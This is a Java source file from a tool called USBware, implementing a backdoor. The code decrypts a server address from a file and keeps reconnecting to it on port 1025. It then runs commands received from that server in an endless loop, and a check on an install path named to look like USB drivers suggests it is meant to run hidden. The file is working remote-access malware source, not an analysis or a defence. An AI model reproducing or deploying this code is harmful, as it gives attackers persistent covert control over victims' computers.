package com.github.thatcherdev.usbware.backdoor;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;
import javax.swing.JOptionPane;
import com.github.thatcherdev.usbware.backend.Utils;

public class Backdoor {

	public static String ip;
	private static Socket socket;
	private static Scanner in;
	public static PrintWriter out;

	/**
	 * Starts backdoor shell.
	 * 
	 * If run for the first time, creates 'gathered' directory, sets {@link ip} to
	 * server IP address using {@link getIP()}, and displays WiFi and backdoor
	 * information if running from a USB drive.
	 * <p>
	 * Attempts to connect to server with {@link ip} on port 1025. Once connected,
	 * initiates {@link in} and {@link out} and starts infinite loop that gets
	 * command from server with {@link in} and handles command with
	 * {@link HandleCommand.handle(String command)}. If exception is thrown,
	 * {@link socket}, {@link in}, and {@link out} are closed and
	 * {@link main(String[] args} is run.
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		if(args.length==0){
			String disp=null;
			try{
				ip=getIP();
				new File("gathered").mkdir();
				disp="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
			}catch(Exception e){
				disp="An error occurred:\n"+e.getMessage();
			}finally{
				if(!System.getProperty("user.dir").equals("C:\\ProgramData\\USBDrivers"))
					JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
				if(disp.contains("An error occurred"))
					System.exit(0);
			}
		}
		try{
			while(true)
				try{
					socket=new Socket(ip, 1025);
					break;
				}catch(Exception e){
					Thread.sleep(3000);
					continue;
				}
			in=new Scanner(socket.getInputStream());
			out=new PrintWriter(socket.getOutputStream(), true);
			while(true){
				String command=in.nextLine();
				HandleCommand.handle(command);
			}
		}catch(Exception e){
			try{
				if(socket!=null)
					socket.close();
				if(in!=null)
					in.close();
				if(out!=null)
					out.close();
				main(new String[]{""});
			}catch(Exception e1){}
		}
	}

	/**
	 * Gets and decrypts IP address of server form 'ip.txt'.
	 * 
	 * @return IP address of server
	 * @throws FileNotFoundException
	 */
	private static String getIP() throws FileNotFoundException {
		Scanner in=new Scanner(new File("ip.txt"));
		String ip=Utils.crypt(in.nextLine(), "USBwareIP");
		in.close();
		return ip;
	}
}